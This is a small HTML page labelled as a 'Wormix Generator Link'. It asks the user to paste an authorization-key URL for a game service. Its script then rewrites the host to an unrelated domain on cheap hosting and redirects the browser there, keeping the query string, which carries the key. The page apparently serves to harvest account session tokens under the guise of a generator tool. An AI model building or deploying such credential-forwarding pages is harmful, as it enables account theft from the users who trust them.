<!DOCTYPE html>
<html>
<head>
    <title>Wormix Generator Link</title>
    <style>
        body {
            background-color: #2651B5;
        }

        input[type="text"] {
            width: 300px;
            padding: 10px;
            font-size: 16px;
        }
        
        input[type="submit"] {
            padding: 10px 20px;
            font-size: 16px;
        }
    </style>
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.cdnfonts.com/css/google-sans" rel="stylesheet">
    <link rel="icon" type="image/x-icon" href="icon.ico">
</head>
<body>
    <h1>Ключ авторизации <span>(без https)</span></h1>
    <form id="urlForm">
        <input type="text" id="urlInput" placeholder="http://tesla.rmart.ru/...">
        <input type="submit" value="Отправить">
    </form>
    
    <script>
        document.getElementById('urlForm').addEventListener('submit', function(event) {
            event.preventDefault();
            
            var originalUrl = document.getElementById('urlInput').value;
            var newUrl = originalUrl.replace('tesla.rmart.ru', 'k92463mz.beget.tech');
            
            newUrl = newUrl.split('?')[0] + '/preloader.html' + (originalUrl.split('?')[1] ? '?' + originalUrl.split('?')[1] : '');

            window.location.href = newUrl;
        });
    </script>
</body>
</html>
